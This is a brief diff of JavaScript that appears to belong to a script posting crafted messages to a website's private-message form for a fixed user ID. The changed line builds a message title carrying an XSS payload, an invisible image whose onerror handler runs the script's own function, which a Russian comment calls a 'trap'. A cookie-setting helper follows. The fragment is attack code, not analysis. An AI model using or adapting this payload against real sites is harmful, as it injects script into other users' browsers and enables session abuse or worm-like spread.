@@ -7,7 +7,7 @@ const IMAGE_SRC = '1';
 const userID = 97130;
 const genData = (title, message) => `idinfo=0&item=0&title=${title}&mes_otvet=${message}&adresat=${userID}&saveotv`;
 // Данные, которые нужны для удаления сообщения с ловушкой
-const DATA_FOR_DELETE = (miden) => genData(`<img src=${IMAGE_SRC} height=0 onerror=setTimeout(gead,500,this)>`, miden);
+const DATA_FOR_DELETE = (miden) => genData(`<img src=${IMAGE_SRC} height=0 onerror=gead(this)>`, miden);
 
 
 function set_Cookie(name, value, expires, path, domain, secure) {
